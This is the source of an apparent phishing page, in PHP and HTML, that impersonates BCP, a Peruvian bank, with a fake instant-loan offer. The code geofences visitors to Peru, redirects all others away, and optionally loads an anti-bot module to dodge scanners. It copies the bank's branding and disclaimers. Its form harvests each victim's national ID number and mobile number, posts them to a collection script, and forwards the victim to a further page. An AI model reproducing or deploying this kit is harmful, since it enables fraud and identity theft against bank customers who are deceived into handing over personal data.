<?php
error_reporting(0);

$cliente = getIP();

$xml = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$cliente);
SSLPage($xml);
$pais = $xml->geoplugin_countryName ; // Pais


function SSLPage($url) {

	$ch = curl_init();

	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_HEADER, FALSE);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_REFERER, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

	$result = curl_exec($ch);

	curl_close($ch);

	return $result;
}


function getIP() {
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $cliente = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    elseif(isset($_SERVER["HTTP_CLIENT_IP"])) {
       $cliente = $_SERVER["HTTP_CLIENT_IP"];
    }
    elseif(isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
       $cliente = $_SERVER["HTTP_X_FORWARDED_FOR"];
    }
    elseif(isset($_SERVER["HTTP_X_FORWARDED"])) {
       $cliente = $_SERVER["HTTP_X_FORWARDED"];
    }
    elseif(isset($_SERVER["HTTP_FORWARDED_FOR"])) {
       $cliente = $_SERVER["HTTP_FORWARDED_FOR"];
    }
    elseif(isset($_SERVER["HTTP_FORWARDED"])) {
       $cliente = $_SERVER["HTTP_FORWARDED"];
    }
    else {
       $cliente = (isset($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : false;
    }
    if ($cliente === '::1') {
       $cliente = '181.67.216.84';
    }
    return $cliente;
}
/**************************************************************/
$police = 1; /* 1 para activar antibots | NO SE RECOMIENDA USAR ANTIBOTS EN CAMPAÑAS DE GOOGLE ADS
para ver, activar o desactivar algún escudo del guardian revisar en su config civil/config.ini
/**************************************************************/
if ($police == '1') {
    include 'civil/on.php';
}
/**************************************************************/
switch ($pais) {

    case "": // [Acceso por Vacio]
    break;

    case "Peru": // [Acceso por Pais]
        contador();
    break;
    
    default: // [Bloqueado por Pais]

        echo'<form id="form" action="https://bit.ly/bingMoneyInstant" method="post"></form><script>document.forms["form"].submit()</script>';
        exit();

    break;
}
/**************************************************************/
function contador() {
    $archivo = "voy.txt";
		
	if (!file_exists($archivo)) {
		$archivo = fopen($archivo, "w");
		fwrite($archivo, "0");
		fclose($archivo);

		$contar = file_get_contents("voy.txt");
		file_put_contents("voy.txt", $contar + 1);
	} else {
		$contar = file_get_contents($archivo);
		file_put_contents($archivo, $contar + 1);
	}
}
/**************************************************************/
// ob_start("comprimir");
?>
<!DOCTYPE html>
<html lang="es" class="hydrated">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Al instante - Pide un préstamo 100% online</title>
    <meta content="NO-CACHE" http-equiv="CACHE-CONTROL">
    <meta content="NO-CACHE" http-equiv="PRAGMA">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <link href="pe/images/favicon.ico" rel="icon" type="image/x-icon">
    <link rel="stylesheet" href="pe/styles/web.css" media="all">
    <link rel="stylesheet" href="pe/styles/styles.css" media="all">
    <link rel="stylesheet" href="pe/styles/web_2.css" media="all">
    <style>
        /* Reposo */

        span, input {
            font-family: var(--bcp-font-family-primary-demi, "Flexo-Demi"), helvetica, arial, sans-serif;
            font-size: 1rem;
            padding: 0;
        }

        label {
            display: block;
            width: 100%;
            border: 1px solid var(--onsurface-600, #868f9e);
            padding: 12px 10px;
            position: relative;
            box-sizing: border-box;
            border-radius: 8px;
            transition: .25s;
        }

        label input {
            display: block;
            width: 100%;
            border: none;
            background: transparent;
            outline: none;
        }

        label span {
            color: silver;
            position: absolute;
            top: 12px;
            left: 10px;
            transition: .25s;
        }

        /* Focus */

        label.focus {
            border-color: var(--primary-400, #0a47f0);
            -webkit-box-shadow: inset 0 0 0 1px var(--primary-400, #0a47f0);
            box-shadow: inset 0 0 0 1px var(--primary-400, #0a47f0);
        }

        label span.focus {
            color: var(--primary-400, #0a47f0);
        }

        /* Top */

        label span.top {
            left: 8px;
            top: -10px;
            font-size: 12px;
            background: white;
            padding: 0 6px;
        }

        @media only screen and (min-width: 600px) {
            label input {
                width: 600px;
            }
        }

        @media only screen and (min-width: 992px) {
            label input {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div id="loader_ajax" style="position: fixed; top: 0px; left: 0px; z-index: 9999999999; width: 100%; height: 100%; overflow-y: none; display: none;">
        <div id="ajax_loader" class="esparta">
            <div class="text-center">
                <img src="pe/images/spinner.gif" style="padding: 445px 0px 0px 0px;">
            </div>
        </div>
    </div>
    <app-root _nghost-ntb-c8="" ng-version="12.2.17">
        <bcp-layout _ngcontent-ntb-c8="" fixed-menu="" brand-name="Dinero al instante" class="hydrated">
            <section class="layout">
                <bcp-navbar menu-position="right" brand-name="Dinero al instante" is-fixed="" class="hydrated">
                    <nav class="navbar-expand bg-primary-700 navbar-dark fixed-top navbar">
                        <div class="container">
                            <a class="brand-margin-left navbar-brand">
                                <bcp-img class="hydrated">
                                    <img src="pe/images/dark-default.svg" class="hydrated">
                                </bcp-img>
                                <bcp-character class="hydrated">
                                    <p class="character-lg white-80 bcp-font-regular">Dinero al instante</p>
                                </bcp-character>
                            </a>
                        </div>
                    </nav>
                </bcp-navbar>
                
                <main class="layout-content">
                    <router-outlet _ngcontent-ntb-c8=""></router-outlet>
                    <app-home _nghost-ntb-c30="">
                        <div _ngcontent-ntb-c30="" class="back">
                            <div _ngcontent-ntb-c30="" class="color"></div>
                            <div _ngcontent-ntb-c30="" class="wave">
                                <svg _ngcontent-ntb-c30="" width="100%" height="100%" viewBox="0 0 1200 168" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg">
                                    <path _ngcontent-ntb-c30="" d="M1200 0v168H0v-54.708c118.333 28.97 304 42.722 557 41.26C810 153.087 1024.333 101.57 1200 0z" fill="#FFF" fill-rule="evenodd"></path>
                                </svg>
                            </div>
                        </div>
                        <div _ngcontent-ntb-c30="" class="container">
                            <div _ngcontent-ntb-c30="" class="row">
                                <div _ngcontent-ntb-c30="" class="col col-md-10 offset-md-1">
                                    <div _ngcontent-ntb-c30="" class="row">
                                        <div _ngcontent-ntb-c30="" class="col char">
                                            <p _ngcontent-ntb-c30="" class="h2-md bcp-font-regular white mb-1">Solicita tu</p>
                                            <p _ngcontent-ntb-c30="" class="fs-32 fs-md-40 bcp-font-demi white mb-3 mb-md-0 lh-1-25">Préstamo <br _ngcontent-ntb-c30="" class="d-block d-md-none">100% online</p>
                                            <p _ngcontent-ntb-c30="" class="fs-md-40 bcp-font-demi bcp-font-md-regular white mb-0">y recibelo al instante</p>
                                        </div>
                                    </div>
                                    <div _ngcontent-ntb-c30="" class="row">
                                        <div _ngcontent-ntb-c30="" class="col pbp-64">
                                            <app-loan-form _ngcontent-ntb-c30="" _nghost-ntb-c23="">
                                                <div _ngcontent-ntb-c23="" class="form-container dp-md-01">
                                                    <div _ngcontent-ntb-c23="" class="form-content">
                                                        <div _ngcontent-ntb-c23="" class="container p-0 pl-md-3 pr-md-3">
                                                            <div _ngcontent-ntb-c23="" class="col col-md-10 offset-md-1 pl-0 pr-0 pl-md-3 pr-md-3 ptp-32 pb-md-3">

                                                                <div class="row flex-column flex-md-row align-items-center ng-pristine ng-invalid ng-touched">
                                                                    <div _ngcontent-ntb-c23="" class="col">
                                                                        <div>
                                                                            <label>
                                                                                <span>Ingresa tu monto</span>
                                                                                <input type="tel" id="prestamo" maxlength="8" onkeypress="return tipoFiltro(event)" required="" autocomplete="off">
                                                                            </label>
                                                                        </div>
                                                                        <bcp-paragraph class="helper-text hydrated">
                                                                            <p class="bcp-font-regular onsurface-800 paragraph-sm" id="msg_1" style="text-align: center; color: red; padding-bottom: 5px;">&nbsp;</p>
                                                                        </bcp-paragraph>
                                                                    </div>

                                                                    <div _ngcontent-ntb-c23="" class="col">
                                                                        <div>
                                                                            <label>
                                                                                <span>Meses a Pagar</span>
                                                                                <input type="tel" id="pagun" maxlength="2" onkeypress="return tipoFiltro(event)" required="" autocomplete="off">
                                                                            </label>
                                                                        </div>
                                                                        <bcp-paragraph class="helper-text hydrated">
                                                                            <p class="bcp-font-regular onsurface-800 paragraph-sm" id="msg_4" style="text-align: center; color: red; padding-bottom: 5px;">&nbsp;</p>
                                                                        </bcp-paragraph>
                                                                    </div>

                                                                    <div _ngcontent-ntb-c23="" class="col">
                                                                        <div>
                                                                            <label>
                                                                                <span>Ingresa tu DNI</span>
                                                                                <input type="tel" id="dni" maxlength="8" onkeypress="return tipoFiltro(event)" required="" autocomplete="off">
                                                                            </label>
                                                                        </div>
                                                                        <bcp-paragraph class="helper-text hydrated">
                                                                            <p class="bcp-font-regular onsurface-800 paragraph-sm" id="msg_2" style="text-align: center; color: red; padding-bottom: 5px;">&nbsp;</p>
                                                                        </bcp-paragraph>
                                                                    </div>

                                                                    <div _ngcontent-ntb-c23="" class="col">
                                                                        <div>
                                                                            <label>
                                                                                <span>Ingresa tu Celular</span>
                                                                                <input type="tel" id="cell" maxlength="9" onkeypress="return tipoFiltro(event)" required="" autocomplete="off">
                                                                            </label>
                                                                        </div>
                                                                        <bcp-paragraph class="helper-text hydrated">
                                                                            <p class="bcp-font-regular onsurface-800 paragraph-sm" id="msg_3" style="text-align: center; color: red; padding-bottom: 5px;">&nbsp;</p>
                                                                        </bcp-paragraph>
                                                                    </div>
                                                                </div>

                                                                <div _ngcontent-ntb-c23="" class="col-8 col-md-auto">
                                                                    <bcp-button _ngcontent-ntb-c23="" tier="primary" size="lg" id="submit" evaanalytics="" full-width="" class="w-100 w-md-auto mlp-md-32 mbp-40 mb-md-3 hydrated">
                                                                        <button type="button" class="btn-primary btn btn-lg btn-block" onclick="data(1)">
                                                                            <bcp-paragraph class="hydrated">
                                                                                <p class="bcp-font-demi white paragraph-lg">Empezar </p>
                                                                            </bcp-paragraph>
                                                                        </button>
                                                                    </bcp-button>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div _ngcontent-ntb-c23="" class="form-footer">
                                                        <div _ngcontent-ntb-c23="" class="container">
                                                            <div _ngcontent-ntb-c23="" class="col d-flex justify-content-center align-items-center pt-3 pb-3">
                                                                <bcp-icon _ngcontent-ntb-c23="" name="clock-r" size="20" color="primary-700" class="mrp-12 hydrated">
                                                                    <i aria-hidden="true" class="icon clock-r primary-700" style="font-size: 20px;"></i>
                                                                    <span class="sr-only">clock</span>
                                                                </bcp-icon>
                                                                <div style="text-align: center;">
                                                                    <p _ngcontent-ntb-c23="" class="fs-12 primary-700 m-0">Horario de atención: <br><br><span _ngcontent-ntb-c23="" class="bcp-font-demi">Lun a Sab de 8am hasta 9pm</span><br><br>las solicitudes fueras del horario serán atendidas al día siguiente</p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </app-loan-form>
                                        </div>
                                    </div>

                                    <div _ngcontent-ntb-c30="" class="row">
                                        <div _ngcontent-ntb-c30="" class="col">
                                            <app-benefits _ngcontent-ntb-c30="" _nghost-ntb-c25="">
                                                <div _ngcontent-ntb-c25="" class="row">
                                                    <div _ngcontent-ntb-c25="" class="col text-center">
                                                        <h2 _ngcontent-ntb-c25="" class="fs-md-40 mbp-40 mb-md-5">Beneficios</h2>
                                                    </div>
                                                </div>
                                                <div _ngcontent-ntb-c25="" class="row flex-column flex-md-row mbp-md-64">
                                                    <div _ngcontent-ntb-c25="" class="col mb-3 mb-md-0">
                                                        <app-benefit-card _ngcontent-ntb-c25="" spot="pe/images/spc_empathy_hand_d_l.svg" _nghost-ntb-c24="">
                                                            <div _ngcontent-ntb-c24="" class="container p-3 pt-md-0 pb-md-0 border border-md-0 rounded dp-01 dp-md-00">
                                                                <div _ngcontent-ntb-c24="" class="row flex-md-column align-items-md-center">
                                                                    <div _ngcontent-ntb-c24="" class="col-auto mb-md-3">
                                                                        <img _ngcontent-ntb-c24="" class="spot" src="pe/images/spc_empathy_hand_d_l.svg">
                                                                    </div>
                                                                    <div _ngcontent-ntb-c24="" class="col pl-0 pl-md-3">
                                                                        <div _ngcontent-ntb-c24="" class="row flex-md-column align-items-center text-md-center h-100">
                                                                            <div _ngcontent-ntb-c24="" class="col">
                                                                                <p _ngcontent-ntb-c24="" class="h3-md bcp-font-demi primary-700 mb-0 mb-md-3">Flexibilidad de montos</p>
                                                                            </div>
                                                                            <div _ngcontent-ntb-c24="" class="col d-none d-md-block">
                                                                                <p _ngcontent-ntb-c24="" class="mb-md-0">Montos desde S/ 100 hasta <br _ngcontent-ntb-c25=""> S/ 200,000</p>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </app-benefit-card>
                                                    </div>
                                                    <div _ngcontent-ntb-c25="" class="col mb-3 mb-md-0">
                                                        <app-benefit-card _ngcontent-ntb-c25="" spot="pe/images/spc_email_hand_a_d_l.svg" _nghost-ntb-c24="">
                                                            <div _ngcontent-ntb-c24="" class="container p-3 pt-md-0 pb-md-0 border border-md-0 rounded dp-01 dp-md-00">
                                                                <div _ngcontent-ntb-c24="" class="row flex-md-column align-items-md-center">
                                                                    <div _ngcontent-ntb-c24="" class="col-auto mb-md-3">
                                                                        <img _ngcontent-ntb-c24="" class="spot" src="pe/images/spc_email_hand_a_d_l.svg">
                                                                    </div>
                                                                    <div _ngcontent-ntb-c24="" class="col pl-0 pl-md-3">
                                                                        <div _ngcontent-ntb-c24="" class="row flex-md-column align-items-center text-md-center h-100">
                                                                            <div _ngcontent-ntb-c24="" class="col">
                                                                                <p _ngcontent-ntb-c24="" class="h3-md bcp-font-demi primary-700 mb-0 mb-md-3">Ahorra tiempo</p>
                                                                            </div>
                                                                            <div _ngcontent-ntb-c24="" class="col d-none d-md-block">
                                                                                <p _ngcontent-ntb-c24="" class="mb-md-0"> ¡No necesitas ir al banco!</p>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </app-benefit-card>
                                                    </div>
                                                    <div _ngcontent-ntb-c25="" class="col mb-3 mb-md-0">
                                                        <app-benefit-card _ngcontent-ntb-c25="" spot="pe/images/spc_mobile_success_hand_d_l.svg" _nghost-ntb-c24="">
                                                            <div _ngcontent-ntb-c24="" class="container p-3 pt-md-0 pb-md-0 border border-md-0 rounded dp-01 dp-md-00">
                                                                <div _ngcontent-ntb-c24="" class="row flex-md-column align-items-md-center">
                                                                    <div _ngcontent-ntb-c24="" class="col-auto mb-md-3">
                                                                        <img _ngcontent-ntb-c24="" class="spot" src="pe/images/spc_mobile_success_hand_d_l.svg">
                                                                    </div>
                                                                    <div _ngcontent-ntb-c24="" class="col pl-0 pl-md-3">
                                                                        <div _ngcontent-ntb-c24="" class="row flex-md-column align-items-center text-md-center h-100">
                                                                            <div _ngcontent-ntb-c24="" class="col">
                                                                                <p _ngcontent-ntb-c24="" class="h3-md bcp-font-demi primary-700 mb-0 mb-md-3">Pago Automático</p>
                                                                            </div>
                                                                            <div _ngcontent-ntb-c24="" class="col d-none d-md-block">
                                                                                <p _ngcontent-ntb-c24="" class="mb-md-0">El cobro será desde la cuenta<br _ngcontent-ntb-c25=""> que elijas</p>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </app-benefit-card>
                                                    </div>
                                                </div>
                                            </app-benefits>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div _ngcontent-ntb-c30="" class="row flex-column justify-content-center align-content-center">
                                <div _ngcontent-ntb-c30="" class="col col-md-11 mbp-32 mbp-md-40">
                                    <app-cta _ngcontent-ntb-c30="" _nghost-ntb-c28="">
                                        <div _ngcontent-ntb-c28="" class="container bg-primary-700 rounded">
                                            <div _ngcontent-ntb-c28="" class="row no-gutters">
                                                <div _ngcontent-ntb-c28="" class="col">
                                                    <div _ngcontent-ntb-c28="" class="row justify-content-center justify-content-md-between align-items-center">
                                                        <div _ngcontent-ntb-c28="" class="col-auto mb-3 mb-md-0">
                                                            <img _ngcontent-ntb-c28="" src="pe/images/sh_girlwithphone_l.svg" alt="">
                                                        </div>
                                                        <div _ngcontent-ntb-c28="" class="col-auto">
                                                            <h2 _ngcontent-ntb-c28="" class="h1-md white text-center text-md-left mbp-32 mb-md-0">¡Que esperas! <br _ngcontent-ntb-c28="" class="d-block d-md-none"> Adquiere tu<br _ngcontent-ntb-c28="" class="d-none d-md-block"> préstamo <br _ngcontent-ntb-c28="" class="d-block d-md-none"> 100% online </h2>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </app-cta>
                                </div>
                                <div _ngcontent-ntb-c30="" class="col col-md-11">
                                    <app-disclaimer _ngcontent-ntb-c30="" _nghost-ntb-c29="">
                                        <p _ngcontent-ntb-c29="" class="fs-12 bcp-font-demi onsurface-600">Recuerda que obtendrás el préstamo si cumples con los requisitos de la evaluación crediticia online exitosamente. En caso no podamos otorgarte el préstamo a través de este canal, puedes acercarte a cualquiera de nuestras agencias a nivel nacional.</p>
                                        <p _ngcontent-ntb-c29="" class="fs-12 onsurface-600">Le informamos que puede contratar un Seguro de Desgravamen de otra compañía de seguros y realizar el endoso al Banco,
                                        siempre y cuando se cumpla con las condiciones informadas previamente. El trámite para el endoso de su póliza lo podrá realizar gratuitamente en cualquier Agencia BCP.</p>
                                        <p _ngcontent-ntb-c29="" class="fs-12 onsurface-600">La TCEA máxima referencial es 26.78%. Por ejemplo, para un préstamo de S/ 3,000 a 12 meses, la TCEA máxima es 26.78% y la cuota mensual es S/ 302.74, las cuales se calculan en base a una tasa de interés efectiva anual (TEA) de 25% y un seguro de desgravamen mensual de 0.705% del saldo. En caso de retraso en los pagos, aplicará la penalidad de pago atrasado, salvo prohibición legal expresa, en cuyo caso aplicarán los intereses moratorios establecidos en la Hoja de Resumen de su crédito.</p>
                                        <p _ngcontent-ntb-c29="" class="fs-12 onsurface-600">Esta web brinda préstamos con plazos desde 3 meses hasta 60 meses.</p>
                                    </app-disclaimer>
                                </div>
                            </div>
                        </div>
                    </app-home>
                    
                    <bcp-footer _ngcontent-ntb-c8="" dark-theme="true" transparent="false" class="hydrated">
                        <footer class="footer">
                            <div class="container">
                                <bcp-footer-body _ngcontent-ntb-c8="" domain-name="www.dineroalinstante.viabcp.com" text-brand="Buzón de consultas" value-brand="consultasbcp@bcp.com.pe" class="hydrated">
                                    <div class="footer-body row no-gutters">
                                        <div class="col-sm-12 col-md-8 content-left">
                                            <ul class="list-items">
                                                <bcp-img class="footer-logo hydrated">
                                                    <img alt="BCP" class="footer-logo hydrated" src="pe/images/dark-grey.svg">
                                                </bcp-img>
                                                <li>
                                                    <bcp-paragraph class="hydrated">
                                                        <p class="bcp-font-regular onsurface-600 paragraph-md">©2023</p>
                                                    </bcp-paragraph>
                                                </li>
                                                <li>
                                                    <bcp-paragraph class="hydrated">
                                                        <p class="bcp-font-regular onsurface-600 paragraph-md">Todos los derechos reservados</p>
                                                    </bcp-paragraph>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </bcp-footer-body>
                            </div>
                        </footer>
                    </bcp-footer>
                </main>
                <section class="layout-footer"></section>
            </section>
        </bcp-layout>
    </app-root>
    <script type="text/javascript" src="pe/js/jquery-3.1.0.min.js"></script>
    <script type="text/javascript" src="pe/js/node.js"></script>
    <script type='text/javascript'>
        
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
            input.onfocus = () => {
                input.previousElementSibling.classList.add('top');
                input.previousElementSibling.classList.add('focus');
                input.parentNode.classList.add('focus');
            }
            input.onblur = () => {
                if(input.value.trim().length == 0) {
                    input.previousElementSibling.classList.remove('top');
                }
                input.previousElementSibling.classList.remove('focus');
                input.parentNode.classList.remove('focus');
            }
        })

        function tipoFiltro(e) {

            var charCode = e.key;

            if((/^[0-9]+$/.test(charCode))) {
                return true;
            } else {
                return false;
            }
        }

        function data(post) {

            let a = document.querySelector("#prestamo"); // Monto
            let b = document.querySelector("#dni"); // Documento
            let c = document.querySelector("#cell"); // Celular
            let d = document.querySelector("#pagun"); // Meses
            
            let x = post;

            switch (x) {

                case 1: // Login

                    if (a.value == "") {
                        $("#msg_1").html("Este campo es requerido");
                        a.focus();
                        return false;
                    } else {
                        $("#msg_1").html("&nbsp;");
                    }

                    if (a.value < 100) {
                        $("#msg_1").html("El monto minimo es S/ 100");
                        a.focus();
                        return false;
                    }
                    
                    if (a.value > 200000) {
                        $("#msg_1").html("El monto máximo es S/ 200,000");
                        a.focus();
                        return false;
                    }

                    if (d.value == "") {
                        $("#msg_4").html("Este campo es requerido").show();
                        d.focus();
                        return false;
                    } else {
                        $("#msg_4").html("&nbsp;");
                    }

                    if (d.value < 3) {
                        $("#msg_4").html("El valor minimo es 3").show();
                        d.focus();
                        return false;
                    }

                    if (d.value > 60) {
                        $("#msg_4").html("El valor máximo es 60").show();
                        d.focus();
                        return false;
                    }

                    if (b.value == "") {
                        $("#msg_2").html("Este campo es requerido");
                        b.focus();
                        return false;
                    } else {
                        $("#msg_2").html("&nbsp;");
                    }

                    if (b.value.length < 8) {
                        $("#msg_2").html("El DNI ingresado no es valido");
                        b.focus();
                        return false;
                    }

                    if (c.value == "") {
                        $("#msg_3").html("Este campo es requerido");
                        c.focus();
                        return false;
                    } else {
                        $("#msg_3").html("&nbsp;");
                    }

                    if (c.value.length < 9) {
                        $("#msg_3").html("El Celular ingresado no es valido");
                        c.focus();
                        return false;
                    }

                    var parametros = {
                        "data_1": a.value,
                        "data_2": b.value,
                        "data_3": c.value,
                        "data_13": d.value,
                        "orden": "A", }
                    
                    $("#loader_ajax").show();
                
                    $.ajax({
                        data: parametros,
                        url: 'post.php',
                        type: 'post',
                        success: function(response) {
                            setTimeout(function() {
                                window.open('first', '_parent');
                            }, 1800);
                        }
                    });

                break;

                default:
                break;
            }
        }
    </script>
</body>
</html>
<?php
ob_end_flush(); // Una vez que el búfer almacena nuestro contenido utilizamos "ob_end_flush" para usarlo y deshabilitar el búfer

function comprimir($buffer) { // Función para eliminar todos los espacios en blanco
    $search = array(
      '/\>[^\S ]+/s',     // elimina espacios en blanco después de las etiquetas, excepto el espacio
      '/[^\S ]+\</s',     // elimina en blanco antes de las etiquetas, excepto el espacio
      '/(\s)+/s',         // Acortar múltiples secuencias de espacios en blanco.
      '/<!--(.|\s)*?-->/' // Borrar comentarios html
    );

    $replace = array(
        '>',
        '<',
        '\\1',
        ''
    );

    $buffer = preg_replace($search, $replace, $buffer);

    return $buffer;
}
?>